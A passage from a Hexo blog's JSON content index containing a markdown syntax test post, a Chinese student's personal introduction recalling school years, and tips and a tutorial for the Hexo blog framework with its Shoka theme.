this.~~ Emphasis, aka italics, with asterisks or underscores. Strong emphasis, aka bold, with asterisks or underscores. Combined emphasis with asterisks and underscores. Strikethrough uses two tildes. Scratch this. # Lists 行高亮123456789101112131415161718192021221. First ordered list item2. Another item * Unordered sub-list.1. Actual numbers don&#x27;t matter, just that it&#x27;s a number 1. Ordered sub-list4. And another item. You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we&#x27;ll use three here to also align the raw Markdown). To have a line break without a paragraph, you will need to use two trailing spaces. Note that this line is separate, but within the same paragraph. (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)* Unordered list can use asterisks- Or minuses+ Or pluses- Paragraph In unordered list For example like this.Common Paragraph with some text.And more text. First ordered list item Another item Unordered sub-list. Actual numbers don't matter, just that it's a number Ordered sub-list And another item. You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we'll use three here to also align the raw Markdown). To have a line break without a paragraph, you will need to use two trailing spaces. Note that this line is separate, but within the same paragraph. (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.) Unordered list can use asterisks Or minuses Or pluses Paragraph In unordered list For example like this. Common Paragraph with some text. And more text. # Inline HTML 行高亮1&lt;p&gt;To reboot your computer, press &lt;kbd&gt;ctrl&lt;/kbd&gt;+&lt;kbd&gt;alt&lt;/kbd&gt;+&lt;kbd&gt;del&lt;/kbd&gt;.&lt;/p&gt; &lt;p&gt;To reboot your computer, press &lt;kbd&gt;ctrl&lt;/kbd&gt;+&lt;kbd&gt;alt&lt;/kbd&gt;+&lt;kbd&gt;del&lt;/kbd&gt;.&lt;/p&gt; 行高亮1234567&lt;dl&gt; &lt;dt&gt;Definition list&lt;/dt&gt; &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt; &lt;dt&gt;Markdown in HTML&lt;/dt&gt; &lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;&lt;/dl&gt; &lt;dl&gt; &lt;dt&gt;Definition list&lt;/dt&gt; &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt; 行高亮12&lt;dt&gt;Markdown in HTML&lt;/dt&gt;&lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt; &lt;/dl&gt; # Links 行高亮1234567891011121314151617[I&#x27;m an inline-style link](https://www.google.com)[I&#x27;m an inline-style link with title](https://www.google.com &quot;Google&#x27;s Homepage&quot;)[I&#x27;m a reference-style link][Arbitrary case-insensitive reference text][I&#x27;m a relative reference to a repository file](../blob/master/LICENSE)[You can use numbers for reference-style link definitions][1]Or leave it empty and use the [link text itself]Some text to show that the reference links can follow later.[arbitrary case-insensitive reference text]: https://hexo.io[1]: https://hexo.io/docs/[link text itself]: https://hexo.io/api/ I'm an inline-style link I'm an inline-style link with title I'm a reference-style link I'm a relative reference to a repository file You can use numbers for reference-style link definitions Or leave it empty and use the link text itself Some text to show that the reference links can follow later. # Images 行高亮12345678910hover to see the title text:Inline-style:![alt text](https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 1&quot;)Reference-style:![alt text][logo][logo]: https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 2&quot; hover to see the title text: Inline-style: Reference-style: # Code and Syntax Highlighting Inline code has back-ticks around it. 12var s = &quot;JavaScript syntax highlighting&quot;;alert(s); 12s = &quot;Python syntax highlighting&quot;print s 12No language indicated, so no syntax highlighting.But let&#x27;s throw in a &lt;b&gt;tag&lt;/b&gt;. # Tables 行高亮12345| |ASCII |HTML ||----------------|-------------------------------|-----------------------------||Single backticks|`&#x27;Isn&#x27;t this fun?&#x27;` |&#x27;Isn&#x27;t this fun?&#x27; ||Quotes |`&quot;Isn&#x27;t this fun?&quot;` |&quot;Isn&#x27;t this fun?&quot; ||Dashes |`-- is en-dash, --- is em-dash`|-- is en-dash, --- is em-dash| ASCII HTML Single backticks 'Isn't this fun?' 'Isn't this fun?' Quotes &quot;Isn't this fun?&quot; &quot;Isn't this fun?&quot; Dashes -- is en-dash, --- is em-dash -- is en-dash, --- is em-dash Colons can be used to align columns. 行高亮12345| Tables | Are | Cool || ------------- |:-------------:| -----:|| col 3 is | right-aligned | || col 2 is | centered | || zebra stripes | are neat | Tables Are Cool col 3 is right-aligned col 2 is centered zebra stripes are neat The outer pipes ( ) are optional, and you don't need to make the raw Markdown line up prettily. You can also use inline Markdown. 行高亮1234Markdown | Less | Pretty--- | --- | ---*Still* | `renders` | **nicely**1 | 2 | 3 Markdown Less Pretty Still renders nicely 1 2 3 You can find more information about LaTeX mathematical expressions here. # Blockquotes Blockquotes are very handy in email to emulate reply text. This line is part of the same quote. Quote break. This is a very long line that will still be quoted properly when it wraps. Oh boy let's keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can put Markdown into a blockquote. # Horizontal Rule Three or more... 行高亮1234567891011---Hyphens***Asterisks___Underscores Hyphens Asterisks Underscores # Line Breaks 行高亮123456Here&#x27;s a line for us to start with.This line is separated from the one above by two newlines, so it will be a *separate paragraph*.This line is also a separate paragraph, but...This line is only separated by a single newline, so it&#x27;s a separate line in the *same paragraph*. Here's a line for us to start with. This line is separated from the one above by two newlines, so it will be a separate paragraph. This line is also a separate paragraph, but... This line is only separated by a single newline, so it's a separate line in the same paragraph. 行高亮123456789This is a regular paragraph.&lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;This is another regular paragraph. This is a regular paragraph. &lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; This is another regular paragraph. # Youtube videos 行高亮1234567&lt;a href=&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot;alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt;Pure markdown version:[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/ARted4RniaU/0.jpg)](https://www.youtube.com/watch?v=ARted4RniaU) &lt;a href=&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU &quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot; alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt; Pure markdown version:","path":"markdown/","date":"11-04","excerpt":"This post is originated from here and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly.","tags":[{"name":"Foo","slug":"Foo","permalink":"http://example.com/tags/Foo/"},{"name":"Bar","slug":"Bar","permalink":"http://example.com/tags/Bar/"}]},{"title":"我的第一篇博客","text":"# 写在前面 总觉得生活里缺少点什么，就以此来填充一下我的枯燥生活吧。 当然啦，衷心地祝福每一个到访本博客的人，你们都是我的好盆友！好基友！ hhhhh！感谢你们😘😘😘 当然这个博客，也是在学习了很多大佬的博客，兼容并蓄，哈哈哈，正好自己也是一个段子手，喜欢写一点东西。 另外，这里可以是我大学生活的一个记录吧，好啦，与君共勉。 接下来对本博客进行一个简单的介绍，作为一个开篇，嘿嘿。 # 博客功能 学习记录，生活记录等等，，，，，，，做笔记 # 笔者自介 接下来简单自报家门嘞，很久以前觉得自己的人生真的是 “丰富多彩”，哈哈，经历过很多吧，笨人记忆力还好（++ 现在还记得高考的每个科目的每道题 bushi ++{.dot .warning}），甚至想写自专，想法很好，现实骨感。 # 我的现在 学业上现在正在川大攻读网络空间安全与法学双学士学位，痛并快乐着。 生活里热爱人际交往 ，即兴演讲， 吹牛搞怪 。另外是打游戏糕手，，比如农药、元神、CF、森林、MC.... 拿王者荣耀来说吧，国服不至于，金标还是有过，元歌代言人，所以有好玩的游戏记得推我。还有是个军事迷，研究国际政治（尬黑一下，仅仅是很爱看，谈不上研究），同时喜欢看各种离奇变态杀人案，建国以来的国内外几乎看过一遍，对于小说喜欢看怪谈和推理文，其余没多大兴趣，有时犯瘾会看看爽文和言情。 技术上热衷计算机技术，数学（显然数学很菜又想学，高考 107，铭记 107，但 96 个志愿里有 43 个数学专业），热衷玩机技术，黑客技术（着迷但很菜） 运动上，渴望成为猛男（），停留在渴望。曾经羽毛球打得还行，能和高中的（渣男）打几个来回，现在打网球、排球、羽毛球。 # 我的故事 （害怕忘记，选择记录）（以下人名除了小学外的均做了一定处理和征得本人同意） **--- 小学：** 小时候在广东待了 10 年，粤语一般般，我指的是潮汕话，潮汕的朋友可以找我搓饭，最爱吃肠粉，有个从小到大的小弟刘弟毛。 印象深刻的人：是很高的潘书婷，学习超牛的邓灿炫，经常打人的郑伟超，教师子女的郑伟钊，住在隔壁的吴宗霖，，，，就记得这么多，也没联系过了，老师也是一年一换，印象不深刻。 另外呢，四年级就回老家了，重庆市忠县（没错就是那个电竞城市），顺溪小学，家住皇华城（皇上住过的小岛）对面，临江，舒服，哈哈哈，也特能吃辣。这里我认识了，emm，很多人，现在都还在联系，影响我很大的雷爽（究极搞怪人，但和我是铁哥们，生死狙击打穿，后来初中也一个班），还有成绩很好的很多很多人，yhx，rj，xcy，yyr，还有个小胖 xzw。 **--- 初中：** 初中是笨人最传奇的时候了（好汉不提当年勇），笨人初中第一次月考年级第一（喷子别喷，学校 1200 人，都过去了，wuwu），而后一发不可收拾，直接保重点高中哩（只有两次没拿期末考试年级第一）。在学校吃喝玩乐，当班长（一位很好的班长初二离开了我接班），当纪律委员，（本班在笨人的带领下喜提重点班倒数第一），但此时仍然是社恐。 **--- 初三暑假：** 这段时光是我记忆很深刻的，我第一次见识到人外有人，天外有天。我和秦峰（现就读于某 C9）走过升学的红地毯，同学们羡慕的眼光里，在学校的循环播报祝福的广播声里（我觉得世界会被我征服，确实飘了），到了忠县最好的高中。我们会提前上高中课程，和全县前 50 的同学们学习，当时数学是不等式，物理是力和运动，每天吃了睡，睡了吃，生活很好，这里认识了超级外向的任剑辉，wh，jyr，还有我觉得很虚的李某某（抽象哥穿丝袜），还有邓子城，时间不长，情谊万千。 另外就是八中夏令营了，啊，全市前几百吧，太厉害了，我倒吸一口凉气。害 \\\\\\ 太多厉害的人了。 高中的印象还很深刻，先不写了。","path":"About-me/My-first-Boke/","date":"11-02","excerpt":"","tags":[{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"}]},{"title":"基于HEXO的写博客tips","text":"# 0. 踩坑 1. 图片问题： 图床不加载：添加 行高亮123&#123;% raw %&#125;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&#123;% endraw %&#125; 2. 自动编号问题 shoka 主题隐藏目录自带标题，并设置显示小标题_shoka 主题标签_宁理大神 1996 的博客 - CSDN 博客 # 1.links 怎么放好友链接，看这里 優萌初華 琉璃的医学 & 编程笔记 優萌初華 https://shoka.lostyu.me 優萌初華 琉璃的医学 & 编程笔记 # 2.code 代码块 使用 markdown-it-prism 进行代码高亮，支持显示行号、行高亮 mark 、命令行提示符 command 、代码块标题。 基本格式：[language][title][url][linktext][mark][command]基本格式： [language] [title] [url] [link text] [mark] [command] 基本格式：[language][title][url][linktext][mark][command] 举个栗子： 行高亮 mark:1,6-7123456import java.util.Scanner;...Scanner in = new Scanner (System.in);// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。System.out.println (in.nextLine ());System.out.println (&quot;Hello&quot; + &quot;world.&quot;); 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1234567891011pwd/usr/home/chris/binls -latotal 2drwxr-xr-x 2 chris chris 11 Jan 10 16:48 .drwxr--r-x 45 chris chris 92 Feb 14 11:10 ..-rwxr-xr-x 1 chris chris 444 Aug 25 2013 backup-rwxr-xr-x 1 chris chris 642 Jan 17 14:42 deploygit add -Agit commit -m &quot;update&quot;git push 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123456789101112131415161718192021```java 行高亮 www.baidu.com 参考链接 mark:1,6-7import java.util.Scanner;...Scanner in = new Scanner (System.in);// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。System.out.println (in.nextLine ());System.out.println (&quot;Hello&quot; + &quot;world.&quot;);``````bash 命令行提示符 command:(&quot;[root@localhost] $&quot;:1,9-10||&quot;[admin@remotehost] #&quot;:4-6)pwd/usr/home/chris/binls -latotal 2drwxr-xr-x 2 chris chris 11 Jan 10 16:48 .drwxr--r-x 45 chris chris 92 Feb 14 11:10 ..-rwxr-xr-x 1 chris chris 444 Aug 25 2013 backup-rwxr-xr-x 1 chris chris 642 Jan 17 14:42 deploygit add -Agit commit -m &quot;update&quot;git push``` 常用到的指令： java 行高亮 mark:1, 某某 bash 命令提示符 command:(&quot;[root@你的名字] $&quot;:1,9-10||&quot;[admin@你的名字] #&quot;:4-6) # 3. 表情包 emoji 绘文字 本功能基于 markdown-it-emoji ，所有标签参考戳此：markdown-it-emoji/lib/data/full.json at master · markdown-it/markdown-it-emoji (github.com) 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123:kissing_heart::ring::notes: 如：😘 💍 两个冒号 # 4. 文字特效 本功能基于 markdown-it-ins 、 markdown-it-bracketed-spans 和 markdown-it-attrs 本主题风格颜色通用样式：default、primary、success、info、warning、danger 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)12345678910111213141516171819202122++ 下划线 ++++ 波浪线 ++&#123;.wavy&#125;++ 着重点 ++&#123;.dot&#125;++ 紫色下划线 ++&#123;.primary&#125;++ 绿色波浪线 ++&#123;.wavy .success&#125;++ 黄色着重点 ++&#123;.dot .warning&#125;~~ 删除线～～~~ 红色删除线～～&#123;.danger&#125;== 荧光高亮 ==[赤橙黄绿青蓝紫]&#123;.rainbow&#125;[红色]&#123;.red&#125;[粉色]&#123;.pink&#125;[橙色]&#123;.orange&#125;[黄色]&#123;.yellow&#125;[绿色]&#123;.green&#125;[靛青]&#123;.aqua&#125;[蓝色]&#123;.blue&#125;[紫色]&#123;.purple&#125;[灰色]&#123;.grey&#125;快捷键 [Ctrl]&#123;.kbd&#125; + [C]&#123;.kbd .red&#125;H~2~029^th^ 这段代码因为自动被 pangu.js 处理了一下，加了几个空格，导致直接复制代码不能正常显示。 正确的代码是 下划线 删除线 荧光高亮 ，不能有空格哦。 # 5. 隐藏文字 行高亮12!! 黑幕黑幕黑幕黑幕黑幕黑幕！！： 鼠标滑过显示内容!! 模糊模糊模糊模糊模糊模糊！！&#123;.bulr&#125; ： 选中文字显示内容 !! 黑幕黑幕黑幕黑幕黑幕黑幕！！： 鼠标滑过显示内容 !! 模糊模糊模糊模糊模糊模糊！！{.bulr} ： 选中文字显示内容","path":"写博客教程/","date":"11-02","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]},{"title":"基于hexo和shoka的博客使用教程","text":"# 1.hexo 官方教程 Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. # Create a new post 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;My New Post&quot; More info: Writing # Run server 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo server More info: Server # Generate static files 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo generate More info: Generating # Deploy to remote sites 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo deploy More info: Deployment # 2. 参考博客 个人博客搭建完整版笔记 | pitt1997 = = 真正的大师永远都怀着一颗学徒的心 早教级别教你使用 Hexo 和 GitHub Pages 搭建属于自己的静态博客 - 搭建博客 - 前端设计 | MyBlog = MqyGalaxy | Blog = 爱好 ACG 的温馨小窝 (moeqy.com) Step.3 界面显示 - Theme Shoka Documentation - 二进制杂谈 - 计算机科学 | Yume Shoka = 優萌初華 = 有夢書架 (lostyu.me) # 3.Shoka 的一些配置和说明 我们已经完成 Hexo 默认安装以及部署，现在我们使用其他主题加载我们的个人博客。 Shoka 主题相关链接如下。 123456主题主页：https://shoka.lostyu.me/文档说明：https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/基本配置: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/config/页面配置: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/依赖插件: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/dependents/ # 4. 发布博客 写一篇文章，步骤参考 # 创建文章 其中 title 为文章的标题。 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;title&quot; 执行完成后 hexo 会根据目录下 scaffolds/post.md，在 source/_posts 文件夹下创建一个名为 title.md 的文件。 123 --- title: hello-worlddate: 2023-11-23 01:03:24tags: --- balabala..... 接下来就可以正式开始写文章了。 # 部署文章 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123hexo g -chexo shexo d 执行完成之后再次访问就可以看到内容了～","path":"基于hexo和shoka的博客使用教程/","date":"11-02","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]}],"categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"},{"name":"大创","slug":"大创","permalink":"http://example.com/tags/%E5%A4%A7%E5%88%9B/"},{"name":"Foo","slug":"Foo","permalink":"http://example.com/tags/Foo/"},{"name":"Bar","slug":"Bar","permalink":"http://example.com/tags/Bar/"},{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"}]}